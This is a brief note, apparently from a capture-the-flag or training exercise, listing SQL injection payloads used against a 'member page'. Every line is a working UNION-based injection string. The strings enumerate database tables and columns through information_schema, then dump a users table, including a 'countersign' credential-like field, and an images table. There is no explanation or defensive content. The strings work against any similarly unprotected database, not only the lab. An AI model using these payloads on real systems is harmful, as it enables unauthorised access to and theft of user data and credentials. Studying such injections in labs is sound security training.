# SQL injection in member page
#SELECT TABLE_NAME FROM information_schema.tables

```
1 OR 1=1 UNION SELECT NULL, NULL-- 
```

```
1 OR 1=1 UNION SELECT table_name, NULL FROM information_schema.tables
```

```
1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
```

```
1 OR 1=1 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
```

//1 OR 1=1 UNION SELECT id, CONCAT(url, title, comment) FROM list_images

-1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images